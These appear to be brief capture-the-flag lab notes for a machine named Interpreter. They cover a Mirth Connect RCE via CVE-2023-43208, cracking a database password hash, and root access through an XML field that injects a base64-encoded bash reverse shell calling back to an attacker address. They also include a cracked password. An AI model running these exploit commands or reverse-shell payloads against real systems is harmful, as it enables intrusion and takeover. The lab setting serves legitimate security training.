
![[interpreter logo.png]]


```
nmap -sVC -p- 10.129.2.110 -oN scan.txt

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 07ebd1b1619a6f3808e01e3e5b6103b9 (ECDSA)
|_  256 fcd57aca8c4fc1bdc72f3aefe15e990f (ED25519)
80/tcp   open  http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sat, 21 Feb 2026 19:08:05 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 21 Feb 2026 19:08:05 GMT
|     Allow: GET, HEAD, TRACE, OPTIONS
|   RTSPRequest:
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   X11Probe:
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
443/tcp  open  ssl/https
|_http-title: Mirth Connect Administrator
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sat, 21 Feb 2026 19:08:11 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 21 Feb 2026 19:08:11 GMT
|_    Allow: GET, HEAD, TRACE, OPTIONS
| http-methods:
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_ssl-date: TLS randomness does not represent time
6661/tcp open  unknown
```

https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT

```
nc -lvnp 9001
```


```
python3 CVE-2023-43208.py -u 'https://10.129.2.110/' -lh '10.10.16.54' -lp 9001
```


shell as mirth

## Hash

mysql creds in mirth conf file

hash in table PERSON_PASSWORD

have to format it for hashcat


Final hash
```
sha256:600000:u/+LBBOU:nadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

```
hashcat -m 10900 hash.txt `fzf-wordlists`
```

password for sedric = snowflake1

# Shell as Sedric

```
ssh sedric@10.129.2.110
snowflake1
```

# Privesc

Found interessting file in /usr/local/bin

allows to inject code into a function


reverse shell in base64

```
proxychains curl -X POST -H "Content-Type: application/xml" -d '<patient>
  <timestamp>1</timestamp>
  <sender_app>test</sender_app>
  <id>1</id>
  <firstname>{__import__("os").system(__import__("base64").b64decode("YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41NC80NDQ0IDA+JjEn").decode())}</firstname>
  <lastname>test</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>test</gender>
</patient>' http://127.0.0.1:54321/addPatient
```

```
nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.2.110.
Ncat: Connection from 10.129.2.110:50716.
bash: cannot set terminal process group (3569): Inappropriate ioctl for device
bash: no job control in this shell
root@interpreter:/usr/local/bin#
```